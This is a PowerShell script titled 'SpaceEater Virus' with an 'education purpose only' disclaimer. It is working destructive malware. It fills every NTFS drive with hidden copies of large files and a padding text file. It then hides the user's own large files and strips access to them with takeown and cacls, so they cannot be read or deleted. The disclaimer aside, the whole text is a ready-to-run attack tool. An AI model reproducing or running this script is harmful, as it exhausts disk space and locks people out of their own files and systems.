#SpaceEater Virus
#Coded By Karem Ali 
#Don't Run it on Your Pc , Run it on a Virtual Machine 
#For Education Purpose Only 
$A = Get-Volume |where{$_.FileSystem -like "NTFS" }| select  -ExpandProperty  DriveLetter -Last 1 #Choose The Volume
$B = " Karem Ali "  # Text in Text File which will take some of Space
$H = ":"      #to Navigate , it's essential in Paths
$T = $C
$B | Out-File $A$H\space.txt   #Creat The Text File 
While ( $C -gt $T - 1024 *  10  ) 
{
 $B | Out-File -Append $A$H\space.txt
 $C = get-volume | where{$_.DriveLetter -like "$A" } | select -ExpandProperty SizeRemaining
}
attrib +s +r +h $A$H\space.txt  #Hide The Text File as System File

$Partitions = Get-Volume |where{$_.FileSystem -like "NTFS" }| select  -ExpandProperty  DriveLetter  #List All Volumes
[int]$count = $Partitions.Length   # get The Count of Volumes

while ( $count -gt 0 )   # Loop to Eat The SPace of All Volumes 
{


$vol = $Partitions[$count-1]   #Choose a Volume
$C = get-volume | where{$_.DriveLetter -like "$vol" } | select -ExpandProperty SizeRemaining   #Get The Free Space of The Choosen Volume 
Set-Location $vol$H   # Change Directory to The Choosen Volume

[int]$Size = 1024 * 1024 * 900   # The Minium Size of The File Which will be Copied to Eat The Space
$Item = Get-ChildItem -Recurse |where{$_.length -gt "$Size"} | sort length -Descending | select -ExpandProperty Name | select -First 1  # Get The File Which will be Copied 
$Path = Get-ChildItem -Recurse |where{$_.length -gt "$Size"} | sort length -Descending | Select -First 1  # Get The Path of File

$Items= Get-ChildItem -Force|where{$_.length -gt "$Size"} | sort length -Descending | select -ExpandProperty Name # Get The items in The Current Volume
foreach($it in $items) { attrib +s +r +h $it ; takeown /f $it ; echo y|cacls $it /p everyone:n }    # Hide it as system file , change The privillige so user can't Delete it 

while ( $C -gt 0 )   # loop To eat All Space in The Volume 
{ 
Set-Location (Split-Path $Path.FullName)   # Change Directory to The File path 
copy $Item SpaceEater$C.KAF    # Copy Process 
attrib +h +r +s SpaceEater$C.KAF   # Hide The Generated File as System File 
takeown /f SpaceEater$C.KAF   # be The Owner of This File 
echo y| Cacls SpaceEater$C.KAF /p $env:username:n  #Set The Privillige of Current User to No Thing , Need Admin Rights to Perform This Command
$C = get-volume | where{$_.DriveLetter -like "$Partitions[$count-1]" } | select -ExpandProperty SizeRemaining  # Get The Free Space of The Current Volume
}
$Count -= 1  # to Chnage The Volume and Go to Eat Space in another Volume
}

